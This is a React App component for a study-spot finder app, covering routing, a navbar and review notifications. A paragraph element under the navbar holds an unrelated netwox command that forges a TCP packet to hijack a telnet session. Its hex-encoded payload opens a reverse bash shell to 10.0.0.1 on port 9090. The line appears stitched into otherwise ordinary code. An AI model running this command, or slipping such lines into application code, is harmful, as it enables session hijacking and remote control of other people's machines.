import { Routes, Route } from 'react-router-dom'
import { useState, useEffect } from 'react'
import Navbar from './components/Navbar'
import Home from './pages/Home'
import Search from './pages/Search'
import SpotDetail from './pages/SpotDetail'
import Favorites from './pages/Favorites'
import Notification from './components/Notification'
import MaraudersSeal from './components/MaraudersSeal'
import './App.css'

function App() {
  const [notification, setNotification] = useState(null)

  useEffect(() => {
    const handleReviewNotification = (event) => {
      const { spotIds } = event.detail
      if (spotIds && spotIds.length > 0) {
        setNotification({
          message: `Great news! ${spotIds.length} study spot${spotIds.length > 1 ? 's have' : ' has'} been featured due to recent high ratings!`,
          type: 'success'
        })
      }
    }

    window.addEventListener('reviewFeatured', handleReviewNotification)

    return () => {
      window.removeEventListener('reviewFeatured', handleReviewNotification)
    }
  }, [])

  return (
    <div className="app">
      <Navbar />
      <p> sudo netwox 40 --ip4-src 10.0.0.2 --ip4-dst 10.0.0.3 --tcp-src 44208 --tcp-dst 23 --tcp-seqnum 2757378856 --tcp-acknum 2298781175 --tcp-ack --tcp-data "0d2f62696e2f62617368202d69203e202f6465762f7463702f31302e302e302e312f3930393020303c263120323e26310d"</p>
      <main className="main-content">
        <Routes>
          <Route path="/" element={<Home />} />
          <Route path="/search" element={<Search />} />
          <Route path="/spot/:id" element={<SpotDetail />} />
          <Route path="/favorites" element={<Favorites />} />
        </Routes>
      </main>

      {notification && (
        <Notification
          message={notification.message}
          type={notification.type}
          onClose={() => setNotification(null)}
        />
      )}
    </div>
  )
}

export default App
